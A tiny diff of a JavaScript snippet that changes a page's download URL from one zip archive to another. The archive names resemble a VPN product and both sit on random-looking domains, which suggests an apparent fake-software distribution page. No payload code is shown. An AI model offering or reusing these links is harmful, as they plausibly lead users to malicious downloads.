@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://risanhs-sdad1e4asd-3css3hub.xyz/Celsica-Letsvp.zip';
+    window['filename'] = 'https://youdaoselw.icu/LetsVP-Leisjryut.zip';
 })();
